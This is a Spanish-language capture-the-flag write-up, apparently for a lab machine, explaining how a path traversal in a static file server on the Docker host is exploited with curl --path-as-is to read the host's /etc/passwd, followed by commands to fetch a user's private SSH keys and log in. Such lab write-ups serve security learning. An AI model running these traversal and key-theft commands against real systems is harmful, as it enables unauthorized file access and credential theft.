# Fase 07 — Lectura arbitraria de ficheros del host (path traversal en el 3000)

> Desde el contenedor alcanzo un servicio del **host** en `172.17.0.1:3000`. Esta fase lo convierte
> en **lectura de cualquier fichero del host** — el puente para robar la clave SSH de `developer`.

## 🎯 Objetivo
Leer ficheros del **host** (no del contenedor) a través del servicio del puerto 3000, empezando por
`/etc/passwd` para mapear usuarios, y acabando en la clave SSH privada de `developer`.

## 🧪 Intento 1 (fallido) — adivinar un endpoint de API
```bash
curl -s 'http://172.17.0.1:3000/api/slice?file=../../../../etc/passwd'
# -> Not Found
```
> 🎓 **Interpretación correcta del 404:** los `../` iban en la **query string**, y curl **no**
> normaliza las query strings → el servidor recibió `file=../../../../etc/passwd` **intacto**. El
> `Not Found` por tanto **no** significa "traversal bloqueado": significa que **el endpoint
> `/api/slice` no existe**. Me lo había inventado. La lección: no asumir rutas de API; el fallo no
> estaba en un parámetro, estaba en cómo el **propio servidor de ficheros** resuelve la ruta.

## 🧪 Intento 2 (éxito) — path traversal en la RUTA + `--path-as-is`
```bash
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd'
```
```
root:x:0:0:root:/root:/bin/bash
...
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```

### 🎓 Por qué `--path-as-is` es imprescindible aquí
`../` en la **ruta** de una URL es un caso especial:

| | Qué hace curl | Qué recibe el servidor | Resultado |
|---|---|---|---|
| **sin** `--path-as-is` | **normaliza** la ruta en el cliente: colapsa `/../../../../etc/passwd` → `/etc/passwd` | `/etc/passwd` (relativo al webroot) | 404 — te saboteas desde el cliente |
| **con** `--path-as-is` | manda la ruta **cruda**, `../` incluidos | `/../../../../etc/passwd` | el SO resuelve el traversal → **lee del host** |

El servidor del 3000 es un *static file server* **sin saneado de rutas**: concatena `webroot + ruta`
y deja que el sistema operativo resuelva. Con suficientes `../` se llega a `/` y se lee **cualquier
fichero del host** con los permisos del proceso del servicio.

> 💡 Nota: la idea previa (Fase 06) de usar el endpoint `/@fs/` de Vite **no hizo falta**. El servidor
> tenía un path traversal "clásico" directamente en la ruta. Hipótesis buena, pero la realidad fue
> aún más simple — se documenta el camino real, no el que imaginé.

## 🔍 Lo que revela `/etc/passwd` (y por qué importa)

| Usuario | Dato | Para qué me sirve |
|---|---|---|
| `developer` | uid 1000, `/home/developer`, **`/bin/bash`** | **Objetivo**: usuario real con login → a por su clave SSH (`user.txt`) |
| `datawrangler` | `/bin/sh` (no bash) | **Confirma la Fase 05**: por eso la reverse shell `bash`/`/dev/tcp` nunca volvió y la de Python puro sí |
| `_laurel` | home `/var/log/laurel`, `/bin/false` | Hay **Laurel + auditd** → logging de auditoría en el host (opsec; a tener en cuenta) |

> 🎯 **Confirmación clave:** este `/etc/passwd` es el del **host**, no el del contenedor (el servicio
> escucha en `172.17.0.1`, el gateway Docker = host). Es decir, ya estoy **leyendo el sistema de
> ficheros del host desde dentro del contenedor**: tengo medio pie fuera del contenedor.

## ▶️ Siguiente — robar la clave SSH de `developer`
```bash
# home conocido por /etc/passwd: /home/developer
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_ed25519'
# plan B: ver claves autorizadas / config
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/authorized_keys'
```
Con la privada:
```bash
printf '%s\n' "<contenido>" > developer.key && chmod 600 developer.key
ssh -i developer.key developer@bedside.htb        # salto contenedor -> host
cat ~/user.txt
```
Helper reutilizable: [`../scripts/read-host-file.sh`](../scripts/read-host-file.sh).

## 🗒️ Estado
- [x] Descartado el endpoint inventado `/api/slice` (no existe; 404 ≠ traversal bloqueado)
- [x] Path traversal confirmado con `--path-as-is` → **lectura de ficheros del host**
- [x] `/etc/passwd` del host leído → `developer` (uid 1000, bash) identificado como objetivo
- [ ] Clave SSH privada de `developer` exfiltrada
- [ ] `ssh developer@host` (escape del contenedor) → **user.txt**

## ➡️ Siguiente (Fase 08)
Con shell de `developer` en el host: `sudo -l`. El write-up apunta a un script de entrenamiento
ejecutable como root que carga un checkpoint de PyTorch/MONAI → **deserialización** (misma clase de
bug que el foothold) → checkpoint malicioso → **root.txt**.
